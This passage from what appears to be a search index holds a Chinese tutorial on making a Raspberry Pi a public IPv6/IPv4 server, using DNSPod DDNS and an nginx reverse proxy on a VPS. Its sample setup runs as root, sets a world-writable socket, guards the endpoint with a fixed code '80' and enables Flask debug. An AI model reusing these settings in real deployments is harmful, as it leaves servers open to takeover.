https://www.polarxiong.com/archives/\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406-\u6210\u4e3aIPv6-IPv4\u516c\u7f51\u670d\u52a1\u5668-\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668.html","title":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6 IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#nginxipv6ipv4","text":"","title":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6/IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_1","text":"\u6811\u8393\u6d3e\u53ea\u9700\u8fde\u63a5\u7535\u6e90\uff0c\u4ee5\u53ca\u6709\u514d\u8d39IPv6\u670d\u52a1\u7684\u7f51\u7ebf\uff0c\u5373\u53ef\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv6\u670d\u52a1\u5668\uff1b\u5982\u679c\u6709\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684\u53cc\u6808\u670d\u52a1\u5668\uff0c\u6811\u8393\u6d3e\u8fd8\u80fd\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv4\u670d\u52a1\u5668\u3002","title":"\u6548\u679c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_2","text":"\u4e4b\u524d\u53d1\u73b0\u5b66\u6821\u63d0\u4f9b\u514d\u8d39\u4e0d\u95f4\u65ad\u7684IPv6\u670d\u52a1\uff0c\u800c\u4e14DigitalOcean\u7684VPS\u4e5f\u80fd\u63d0\u4f9bIPv6\u7f51\u7edc\uff0c\u6240\u4ee5\u840c\u751f\u4e86\u81ea\u5df1\u5efa\u7acb\u670d\u52a1\u5668\u7684\u60f3\u6cd5\u3002 \u9274\u4e8e\u9700\u8981\u4e00\u53f0\u8017\u7535\u91cf\u5c0f\u3001\u566a\u58f0\u5c0f\u4e14\u80fd\u591f\u957f\u671f\u4e0d\u5173\u673a\u8fd0\u884c\u7684\u670d\u52a1\u5668\uff0c\u81ea\u7136\u800c\u7136\u60f3\u5230\u4e86\u6811\u8393\u6d3e\u3002\u4e8e\u662f\u7ecf\u8fc7\u51e0\u5929\u7684\u6298\u817e\uff0c\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u628a\u6811\u8393\u6d3e\u4f5c\u4e3a\u516c\u7f51\u670d\u52a1\u5668\u7684\u60f3\u6cd5\uff0c\u4f46\u79bb\u7406\u60f3\u60c5\u51b5\u8fd8\u662f\u6709\u4e9b\u5dee\u8ddd\uff0c\u4e3b\u8981\u7279\u70b9\uff1a \u672c\u5730\u800c\u8a00\u53ea\u9700\u8981\u7528\u5230IPv6\u7f51\u7edc\uff0c\u5bf9IPv4\u7f51\u7edc\u6ca1\u6709\u8981\u6c42 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668\uff0c\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u4f46\u5411DNSPod\u66f4\u65b0DNS\u4fe1\u606f\u9700\u8981\u6709\u672c\u5730\u6216\u8fdc\u7a0bIPv4\u7f51\u7edc\u7684\u652f\u6301 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668\uff0c\u91c7\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u4e00\u5b9a\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff08\u7406\u8bba\u4e0a\u672c\u5730\u53cc\u6808\u7535\u8111\u4e5f\u53ef\u4ee5\uff09","title":"\u52a8\u673a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_3","text":"\u8fd9\u91cc\u5047\u8bbe\u7684\u90fd\u662f\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u5373DigitalOcean\u5728\u65e7\u91d1\u5c71\u7684\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684VPS\u3002","title":"\u5927\u4f53\u601d\u8def"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ipv6","text":"\u6b64\u65f6\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u56e0\u4e3a\u81ea\u5df1\u6709\u57df\u540d\uff0c\u800cDNSPod\u652f\u6301IPv6\u7684AAAA\u8bb0\u5f55\uff0c\u4e14DNSPod\u63d0\u4f9bAPI\uff0c\u6240\u4ee5\u91c7\u7528\u6bcf\u6b21IPv6\u5730\u5740\u53d8\u5316\u5219\u5411DNSPod\u53d1\u9001\u4fee\u6539\u8bb0\u5f55\u8bf7\u6c42\uff0c\u8fd9\u6837\u5b9e\u73b0DDNS\u3002 \u5176\u4e2d\u5b58\u5728\u7684\u95ee\u9898\u662fDNSPod\u5e76\u4e0d\u652f\u6301\u7eafIPv6\u73af\u5883\u4e0b\u7684API\u8bf7\u6c42\uff0c\u5373\u53d1\u9001\u8bf7\u6c42\u5fc5\u987b\u7528\u5230IPv4\u7f51\u7edc\uff08\u901a\u8fc7IPv4\u7f51\u7edc\u53d1\u9001IPV6\u8bb0\u5f55\u7684\u4fee\u6539\u8bf7\u6c42\uff09\u3002\u6240\u4ee5\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u672c\u5730\u901a\u8fc7IPv6\u4f5c\u4e3ahttp\u7684client\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u4f5c\u4e3ahttp server\u63a5\u6536\u8bf7\u6c42\uff0c\u5e76\u8bb0\u5f55\u8bf7\u6c42\u7684IPv6\u5730\u5740\uff08\u5373\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\uff09\uff0c\u7136\u540e\u8fdc\u7a0b\u670d\u52a1\u5668\u901a\u8fc7IPv4\u8c03\u7528DNSPod API\uff0c\u4fee\u6539\u5bf9\u5e94\u8bb0\u5f55\uff0c\u5b9e\u73b0DDNS\u3002","title":"\u4f5c\u4e3aIPv6\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ipv4","text":"\u6b64\u65f6\u91c7\u7528\u53cd\u5411\u4ee3\u7406\u65b9\u6cd5\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668nginx\u8bbe\u7f6e\u53cd\u5411\u4ee3\u7406\uff0c\u5730\u5740\u4e3a\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\u3002\u8fd9\u6837\u53ef\u4ee5\u5229\u7528DDNS\u65f6\u8fdc\u7a0b\u670d\u52a1\u5668\u5f97\u5230\u7684IPv6\u5730\u5740\uff0c\u6765\u66f4\u65b0nginx\u4e2d\u53cd\u5411\u4ee3\u7406\u7684\u8bbe\u7f6e\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u67d0\u4e2aIPv4\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u672c\u5730\u670d\u52a1\u5668\u65f6\uff0c\u5176\u901a\u8fc7\u57df\u540d\u8bbf\u95ee\u9996\u5148\u4f1a\u901a\u8fc7IPv4\u8bbf\u95ee\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\u5c06\u8bf7\u6c42\u901a\u8fc7IPv6\u53d1\u9001\u5230\u672c\u5730\u670d\u52a1\u5668\uff0c\u672c\u5730\u670d\u52a1\u5668\u4f5c\u51fa\u54cd\u5e94\u540e\uff0c\u5c06\u7ed3\u679c\u901a\u8fc7IPv6\u8fd4\u56de\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u6700\u540e\u901a\u8fc7IPv4\u8fd4\u56de\u5230\u7528\u6237\u3002 \u53ef\u4ee5\u8bf4\u4e00\u6b21\u8bf7\u6c42\u9700\u8981\u8de8\u8d8a4\u6b21\u592a\u5e73\u6d0b\uff0c\u4f46\u6839\u636e\u5b9e\u9645\u6d4b\u8bd5\uff0c\u54cd\u5e94\u65f6\u95f4\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u3002","title":"\u4f5c\u4e3aIPv4\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_4","text":"","title":"\u5177\u4f53\u5b9e\u73b0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_5","text":"\u6811\u8393\u6d3e\u5e76\u6ca1\u6709\u4f7f\u7528\u5b98\u65b9\u56fa\u4ef6\uff0c\u800c\u662f\u6700\u521d\u91c7\u7528\u4e86Ubuntu 14.04 LTS\uff0c\u5176\u540e\u8f6c\u79fb\u5230Ubuntu 15.04\u3002\u56e0\u4e3a\u662f\u4f5c\u4e3aserver\u7528\uff0c\u6240\u4ee5\u66f4\u503e\u5411\u4e8e\u91c7\u7528Ubuntu\u7684server\u7248\u672c\u3002 \u5173\u4e8e\u6811\u8393\u6d3e\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\uff0c\u5b9e\u9645\u5c31\u662fUbuntu\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\u4e86\uff0c\u8fd9\u6837\u7684\u4f8b\u5b50\u5f88\u591a\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u6211\u4e4b\u524d\u4e5f\u6709\u5199\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\u3002","title":"\u5173\u4e8e\u6811\u8393\u6d3e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_6","text":"\u56e0\u4e3a\u672c\u5730IPv6\u5730\u5740\u662fDHCP\u5206\u914d\uff0c\u4e00\u76f4\u5728\u53d8\u52a8\uff0c\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u9891\u7e41\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002\u56e0\u4e3a\u6211\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u8fd0\u884c\u6709Flask\u5e94\u7528\uff0c\u800c\u6211\u5bf9Python\u6bd4\u8f83\u719f\u6089\uff0c\u52a0\u4e0a\u5bf9\u4e8e\u65b9\u6848\u5b9e\u73b0\u6211\u6bd4\u8f83\u503e\u5411\u4e8e\u7528http\u5b9e\u73b0\uff0c \u6240\u4ee5\u8003\u8651\u518d\u4e09\u51b3\u5b9a\u91c7\u7528nginx+uwsgi+flask+python \u3002 \u7ed3\u6784\uff1anginx\u8bbe\u5b9a\u8bf7\u6c42\u7684URL\uff0c\u5c06\u6b64URL\u7684\u8bf7\u6c42\u8bbe\u5b9a\u4e3a\u8f6c\u53d1\u5230flask\u5e94\u7528\u4e0a\uff1buwsgi\u4f5c\u4e3aflask\u548cnginx\u4e4b\u95f4\u7684\u6865\u6881\uff0c\u5e76\u4e14\u7528\u6765\u7ba1\u7406flask\u5e94\u7528\uff1bflask\u4f5c\u4e3a\u7f51\u7edc\u6846\u67b6\u63d0\u4f9b\u7f51\u7edc\u652f\u6491\uff0c\u5904\u7406\u8bf7\u6c42\u6570\u636e\u548c\u6570\u636e\u7684\u8fd4\u56de\uff1bpython\u4f5c\u4e3aflask\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u6765\u8c03\u7528DNSPod API\uff0c\u4ee5\u53ca\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5b9e\u73b0\u52a8\u6001\u7684\u53cd\u5411\u4ee3\u7406\u3002","title":"\u8fdc\u7a0b\u670d\u52a1\u5668\u7aef"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ddns","text":"\u5148\u8d34\u4e3b\u8981\u4ee3\u7801\uff1a def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') \u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528API\u4e86\uff0c\u6211\u8fd9\u91cc\u662f\u5728\u66f4\u65b0test.polarxiong.com\u7684\u8bb0\u5f55\u3002 \u5173\u4e8e\u9700\u8981domain_id\u548crecord_id\uff0c\u4f3c\u4e4e\u53ea\u80fd\u4eceAPI\u83b7\u53d6 \uff0c\u5199\u4e86\u4e00\u6bb5\u4ee3\u7801\u7528\u6765\u83b7\u53d6\uff1a import urllib.request import urllib.parse import json login_email = 'THE_EMAIL' login_password = 'THE_PASSWORD' def get_json(url, data): con = urllib.request.urlopen( url, data=urllib.parse.urlencode(data).encode()) return json.loads(con.read().decode()) def get_domain_id(): url = 'https://dnsapi.cn/Domain.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json' } json = get_json(url, data) for domain in json['domains']: print('domain name:%s\\tdomain id:%s' % (domain['name'], domain['id'])) def get_record_id(domain_id): url = 'https://dnsapi.cn/Record.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json', 'domain_id': domain_id } json = get_json(url, data) print('domain name:%s\\tdomain id:%s' % (json['domain']['name'], json['domain']['id'])) for record in json['records']: print('record name:%s\\trecord type:%s\\trecord id:%s' % (record['name'], record['type'], record['id'])) if __name__ == '__main__': get_domain_id() \u6ce8\u610f\uff1a \u5bf9\u4e8e\u4fee\u6539\u8bb0\u5f55API\u7684\u8c03\u7528\uff0cDNSPod\u6709\u9650\u5236\uff1a\u5982\u679c1\u5c0f\u65f6\u4e4b\u5185\uff0c\u63d0\u4ea4\u4e86\u8d85\u8fc75\u6b21\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u7684\u8bb0\u5f55\u4fee\u6539\u8bf7\u6c42\uff0c\u8be5\u8bb0\u5f55\u4f1a\u88ab\u7cfb\u7edf\u9501\u5b9a1\u5c0f\u65f6\uff0c\u4e0d\u5141\u8bb8\u518d\u6b21\u4fee\u6539\u3002\u6bd4\u5982\u539f\u8bb0\u5f55\u503c\u5df2\u7ecf\u662f 1.1.1.1\uff0c\u65b0\u7684\u8bf7\u6c42\u8fd8\u8981\u6c42\u4fee\u6539\u4e3a 1.1.1.1\u3002","title":"DDNS\u90e8\u5206"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_7","text":"nginx\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u5411\u4ee3\u7406server\uff1a server { listen 80; server_name pi.polarxiong.com; location / { proxy_pass http://[2001:250:5002:8100::3:9b63]; # for raspberry pi proxy_set_header Host $host; } } python\u5b9e\u73b0\u4ee3\u7801\uff1a def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u627e\u5230\u9700\u8981\u4fee\u6539\u7684IPv6\u5730\u5740\uff08 \u6240\u4ee5# for raspberry pi\u5fc5\u4e0d\u53ef\u5c11 \uff09\uff0c\u518d\u901a\u8fc7\u5b57\u7b26\u4e32\u66ff\u6362\uff08\u5c1d\u8bd5\u76f4\u63a5\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u66ff\u6362\uff0c\u4f46\u4e00\u76f4\u6ca1\u5b9e\u73b0\uff09\uff0c\u91cd\u65b0\u5199\u5165\u914d\u7f6e\u6587\u4ef6\uff1b\u6700\u540e\u91cd\u542fnginx\u670d\u52a1\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u6bb5\u5f88\u5371\u9669\u7684\u4ee3\u7801\uff0c\u4f1a\u76f4\u63a5\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002","title":"\u53cd\u5411\u4ee3\u7406\u90e8\u5206"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flask","text":"\u5148\u8d34\u4ee3\u7801\uff1a from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() \u5ba2\u6237\u7aef\u53d1\u9001GET\u8bf7\u6c42\uff0cFlask\u6536\u5230\u8bf7\u6c42\u540e\u9996\u5148\u6821\u5bf9 code \uff0c\u7528\u6765\u9632\u6b62\u6076\u610f\u8bf7\u6c42\u3002\u7136\u540e\u83b7\u53d6\u5ba2\u6237\u7aefIP\u5730\u5740\uff0c\u4ea4\u7ed9python\u53bb\u5b9e\u73b0\u3002","title":"Flask\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#uwsgi","text":"\u5173\u4e8enginx+uwsgi+flask\u7684\u914d\u7f6e\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u8fc7\uff0c\u8fd9\u91cc\u5c31\u53ea\u5199\u4e3b\u8981\u90e8\u5206","title":"uwsgi\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#systemd","text":"\u8def\u5f84\uff1a /etc/systemd/system/ddns.service [Unit] Description=uWSGI instance to serve DDNS After=network.target [Service] User=root Group=root WorkingDirectory=/home/zhantong/ddns Enrironment=\"PATH=/usr/bin\" ExecStart=/usr/bin/uwsgi --ini ddns.ini [Install] WantedBy=multi-user.target \u8fd9\u91cc\u8bbe\u5b9aUser\u548cGroup\u5747\u4e3aroot\u662f\u6781\u5176\u5371\u9669\u7684\uff0c\u4f46\u4e5f\u662f\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u9700\u8981\u8bfb\u53d6\u548c\u5199\u5165nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002","title":"systemd\u4e2d\u914d\u7f6e\u670d\u52a1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#uwsgi_1","text":"\u8def\u5f84\uff1a /home/zhantong/ddns [uwsgi] module = proxy_and_ddns processes = 1 vhost = true socket = ddns.sock chmod-socket = 777 vacuum = true die-on-term = true \u8fd9\u91cc\u5176\u5b9e\u6709\u4e00\u4e9b\u7ec6\u8282\u95ee\u9898\uff0c\u5c31\u4e0d\u8bf4\u4e86\u3002 proxy_and_ddns \u5c31\u662f proxy_and_dds.py \uff0cflask\u4ee3\u7801\u3002","title":"uwsgi\u914d\u7f6e\u6587\u4ef6"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#nginx","text":"\u6700\u540e\u9700\u8981\u52a0\u5165\u8bf7\u6c42URL\uff0c\u5e76\u5c06\u5176\u8f6c\u53d1\u5230flask\uff0c\u6240\u4ee5nginx\u5173\u4e8e\u8fd9\u90e8\u5206\u7684server\uff1a server { listen [::]:80 ipv6only=on; server_name ipv6.polarxiong.com; location / { include uwsgi_params; uwsgi_pass unix:/home/zhantong/ddns/ddns.sock; } } ipv6.polarxiong.com\u5728DNSPod\u4e2d\u8bbe\u7f6e\u4e86\u8bb0\u5f55\u4e3aAAAA\uff0c\u6307\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u7684IPv6\u5730\u5740\u3002","title":"nginx\u914d\u7f6e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_8","text":"\u672c\u5730\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u5bf9\u5bf9\u5e94URL\u53d1\u9001GET\u8bf7\u6c42 import urllib.request code = '80' urllib.request.urlopen('http://ipv6.polarxiong.com/ipv6?code=' + code) \u53ef\u4ee5\u5229\u7528Ubuntu\u4e2d\u7684corn\u6765\u5b9e\u73b0\u5b9a\u65f6\u8fd0\u884c\u3002","title":"\u672c\u5730\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_9","text":"\u4e0a\u9762\u8bf4\u7684\u5f88\u4e71\uff0c\u4f46\u7406\u987a\u4e86\u8fd8\u662f\u633a\u5bb9\u6613\u7684\uff0c\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662ftest.polarxiong.com\u5bf9\u5e94\u7684IP\u5c31\u662f\u6811\u8393\u6d3e\u7684IPv6\u5730\u5740\uff0c\u5373\u901a\u8fc7IPv6\u8bbf\u95eetest.polarxiong.com\u5c31\u662f\u76f4\u63a5\u8bbf\u95ee\u6811\u8393\u6d3e\uff1b\u800cpi.polarxiong.com\u662f\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\uff0c\u901a\u8fc7IPv4\u8bbf\u95ee\u6811\u8393\u6d3e\u3002","title":"\u7ed3\u675f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3